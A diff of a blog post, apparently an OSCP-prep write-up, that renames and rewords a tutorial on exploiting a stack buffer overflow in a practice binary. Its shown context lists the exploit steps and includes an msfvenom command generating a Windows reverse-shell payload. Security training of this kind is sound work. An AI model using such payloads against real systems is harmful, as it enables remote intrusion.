@@ -1,15 +1,13 @@
 ---
 layout: post
-title:  "Writeup - dostackbufferoverflow.exe"
+title:  "Easy stack buffer overflow steps"
 date:   2020-02-05 08:07:19
 categories: [buffer-overflow,oscp-prep]
 comments: true
 ---
 
 
-To demonstrate binary used is dostackbufferoverflowgood.exe
-
-## Steps to be followed for smashing stack bufferoverflow
+**Easy steps for smashing stack buffer overflow:**
 
 Fuzzing --> finding offset --> Finding bad character --> RET to 'JMP ESP' --> Generating shell code
 
@@ -104,7 +102,7 @@ This is the final step. Use msfvenom to generate shell code.
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "\x00\x0A"`
 
-So our final python program look like this
+So our final python program look like this for the binary dostackbufferoverflow.exe
 
 ```python
 from pwn import *
